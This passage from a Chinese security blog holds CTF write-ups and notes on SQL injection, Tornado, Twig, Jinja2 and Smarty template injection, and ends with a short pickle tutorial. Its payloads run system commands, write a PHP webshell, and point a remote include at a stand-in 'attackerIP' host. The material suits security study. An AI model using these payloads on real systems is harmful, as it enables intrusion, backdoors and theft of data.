<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>这样子注释符就只会注释掉email那行最后面的单引号和逗号，从而报错信息变为 <code>icq='12345' balabala</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
<p>图上报错信息中的换行符也应证了我的猜想。</p>
<h1 id="level-9">Level-9</h1>
<h2 id="题目描述-8">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213950.png" /></p>
<p>在输入框填入东西后，提交查询，发现多了信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
<p>因此猜测后台使用的语句是 <code>insert into</code>。</p>
<p><code>inser into</code> 语句格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">指定所要插入数据的列:</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line">一次性添加多个：（注意，如果有主键，主键必须不同）</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...</span><br></pre></td></tr></table></figure>
<h2 id="测试注入点-8">测试注入点</h2>
<p>依次对三个输入框添加单引号，发现 <code>autor=1&amp;title=1&amp;text=1'</code> 时出现报错信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>输入 <code>autor=1&amp;title=1&amp;text=1')#</code> 发现页面正常，验证了猜测。</p>
<h2 id="注入过程-8">注入过程</h2>
<p>利用一次性添加多个。</p>
<p>构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
<p>带入后为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>正好将 username 和 password 作为 autor 和 title 显示出来。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
<p>成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
<h1 id="level-10">Level-10 ⭐</h1>
<h2 id="题目描述-9">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
<p>点击 login 发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220532.png" /></p>
<p>也就是这里需要垂直提权。</p>
<h2 id="测试注入点-9">测试注入点</h2>
<p>由于没有多余的信息，并且url也不存在注入点，所以抓包看看： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
<p>一般垂直提权都是看cookie，但是这里cookie的信息是登录每道题的，所以应该是post中的 <code>login</code>。将上面的字符串base64解码后得到： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里应该需要修改username和password的值，也就是第2和第4的内容。</p>
<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>用户名为：<code>TheMaster</code>。密码不知道，所以 password 即为注入点。</p>
<h2 id="注入过程-9">注入过程</h2>
<p>本题要想成功登录，就得 where 后面的语句为真，即<code>username=$username</code>和<code>password=$password</code>同时为真。前者简单，后者可以这么操作，即<code>password=true</code>，这样子就能绕过where的判断。</p>
<p>因此最后的payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">解释：bool型的就是b，且true为1，false为0</span><br></pre></td></tr></table></figure></p>
<p>经过base64编码后带入即可成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert into等。有时候还要猜测后台语句的写法，或者像 Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Tornado_render模板注入</title>
    <url>/2022/04/05/Tornado_render%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>记录一下关于Tornado模板注入的知识点以及相关的payload。</p>
<span id="more"></span>
<h1 id="原理">原理</h1>
<p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
<p>这个模板就遇到一道题目，结合着一起说明。</p>
<h1 id="题目信息">题目信息</h1>
<p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1">攻防世界_easytornado</a></p>
<p>进入环境之后，有三个文件</p>
<ol type="1">
<li>flag.txt</li>
<li>welcome.txt</li>
<li>hints.txt</li>
</ol>
<p>文件的内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag.txt:</span><br><span class="line">/flag.txt  </span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">welcome.txt:</span><br><span class="line">/welcome.txt  </span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">hints.txt:</span><br><span class="line">/hints.txt  </span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure></p>
<p>每个文件都给了很多的信息：</p>
<ol type="1">
<li>flag在fllllllllllllag文件里</li>
<li>该题使用的是render，也就是tornado模板引擎</li>
<li>一种加密方式</li>
</ol>
<p>这是注意到url，每查看一个文件，url都不同，并且有一串奇怪的hash值。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405142849.png" /></p>
<p>据此猜测，<code>filehash=md5(cookie_secret+md5(filename))</code>。</p>
<p>此时，已知flag所在文件名，并且加密方式也知道了，那么只需要知道<code>cookie_secret</code>就可以得到flag。</p>
<h1 id="解题">解题</h1>
<p>随便修改filehash值，发现来到一个新的页面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143238.png" /></p>
<p>url中<code>msg=Error</code>，猜测注入点在这，输入测试payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;datetime&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143457.png" /></p>
<p>到这里确定，本题存在SSTI漏洞，模板引擎为Tornado。</p>
<p>查Tornado的官方文档得知：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405143614.png" /></p>
<p>settings中存在着<code>cookie_secret</code>，而settings是<code>RequestHandler</code>的一个方法。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405144010.png" /></p>
<p>我们只需要访问<code>RequestHandler.settings</code>就可以知道<code>seret.cookie</code>。<code>RequestHandler</code>是一个类，<code>handler</code>指向的处理当前这个页面的<code>RequestHandler</code>对象，因此，有下列等价关系： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler.settings &lt;-&gt; RequestHandler.settings &lt;-&gt; self.application.settings</span><br></pre></td></tr></table></figure></p>
<p>因此，输入payload <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405144419.png" /></p>
<p>成功得到<code>secret_cookie</code>。</p>
<p>接下来只需要计算fliehash即可。编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line">cookie_secret = <span class="string">&quot;95444e41-8037-4da5-bb59-fc97325154d5&quot;</span> <span class="comment"># cookie_secret  </span></span><br><span class="line">filename = <span class="string">&quot;/fllllllllllllag&quot;</span> <span class="comment"># filename  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getValue</span>(<span class="params"><span class="built_in">str</span></span>):</span>  </span><br><span class="line">    md5 = hashlib.md5()  </span><br><span class="line">    md5.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf-8&quot;</span>))  </span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()  </span><br><span class="line">filehash = getValue(cookie_secret + getValue(filename))  <span class="comment"># filehash  </span></span><br><span class="line"><span class="built_in">print</span>(filehash)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405145257.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Tornado</tag>
      </tags>
  </entry>
  <entry>
    <title>Twig模板注入</title>
    <url>/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>记录一下关于Twig模板注入的知识点以及相关的payload。</p>
<span id="more"></span>
<h1 id="twig-1.x">Twig 1.x</h1>
<p>在Twig 1.x下，存在全局变量<code>_self</code>，指向的是引用当前模板的实例，代码层面如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> specialVars = [</span><br><span class="line">    <span class="string">&#x27;_self&#x27;</span> =&gt; <span class="string">&#x27;this&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
<p>可以利用_self变量，返回当前 实例，该实例提供了指向Twig_Environment的env属性，因此，可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。</p>
<p>比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attackerIP:port&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoorFile&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在SSTI的应用中，主要是因为<code>getFilter</code>函数中存在危险函数<code>call_user_func</code> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 第一个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">foreach</span> (this-&gt;filterCallbacks <span class="keyword">as</span> callback) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (<span class="literal">false</span> !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">			<span class="keyword">return</span> filter;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 第二个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="keyword">callable</span></span>)</span>&#123;</span><br><span class="line">	this-&gt;filterCallbacks[] =<span class="keyword">callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>简单解释一下代码（不是很懂PHP）</strong>：</p>
<p><code>getFilter</code>函数可以将<code>this-&gt;filterCallbacks</code>数组中的元素当作PHP函数的名称而调用，<code>name</code>就是PHP函数的参数。</p>
<p>而<code>registerUndefinedFilterCallback</code>函数可以设置<code>this-&gt;filterCallbacks</code>数组，因此，思路就是先通过第二个函数设置我们要执行的函数，比如说<code>exec</code>，然后通过第一个函数调用这个函数，并由<code>name</code>传入函数执行所必要的参数。</p>
<p>因此，构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这句话就类似在Linux系统中的shell直接执行命令<code>id</code>。</p>
<p>在Twig 2.x/3.x中<code>_self</code>的作用发生变化，此payload不能继续使用。</p>
<p>例题：<a href="https://hdfzzf.icu/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/">BJDCTF20Cookie is so stable</a></p>
<h1 id="twig-2.x-3.x">Twig 2.x / 3.x</h1>
<h2 id="map过滤器">map过滤器</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]|map(<span class="string">&quot;assert&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval(<span class="subst">$_POST</span>[shell])&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;    <span class="comment">// 写 Webshell</span></span><br></pre></td></tr></table></figure></p>
<h2 id="sort过滤器">sort过滤器</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
<h2 id="filter过滤器">filter过滤器</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
<h2 id="reduce过滤器">reduce过滤器</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
<h1 id="参考白嫖">参考（白嫖）</h1>
<ol type="1">
<li>http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/</li>
<li>https://xz.aliyun.com/t/10056#toc-16</li>
</ol>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Twig</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_SSTI_2</title>
    <url>/2022/04/05/bugku_SSTI_2/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
<p>因此判断模板引擎是Jinjia2或者是flask。 # 2 payload 输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接下来共有4种方法</p>
<ul>
<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>方法2</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Jinjia2</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_聪明的php</title>
    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
<p>随便给一个参数，得到如下界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
<p>版本为3.1。</p>
<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
<h2 id="命令执行">命令执行</h2>
<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
<h2 id="if标签">{if}标签</h2>
<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle 库</title>
    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
    <content><![CDATA[<p>pickle 库的简单使用。</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
<h1 id="介绍">介绍</h1>
<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
<h1 id="常用方法">常用方法</h1>
<p>主要由两类接口，即序列化和反序列化。</p>
<p>其中序列化包括： 1. dump() 2. dumps()</p>
<p>反序列化包括： 1. load() 2. loads()</p>
<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
<h2 id="dump">dump</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
</blockquote>
<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
